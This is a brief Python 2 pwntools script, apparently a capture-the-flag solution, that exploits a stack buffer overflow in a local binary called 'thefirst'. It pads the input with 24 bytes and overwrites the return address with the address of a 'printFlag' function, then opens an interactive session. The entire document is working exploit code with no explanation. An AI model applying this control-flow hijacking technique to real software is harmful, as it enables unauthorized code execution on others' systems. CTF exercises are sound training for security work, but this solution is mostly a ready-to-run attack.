from pwn import *

e = ELF('./thefirst')
p = process('./thefirst')

printFlag_addr = e.symbols['printFlag']

payload = 'A'*24
payload += p32(printFlag_addr)

p.sendline(payload)
p.interactive()
print p.recv()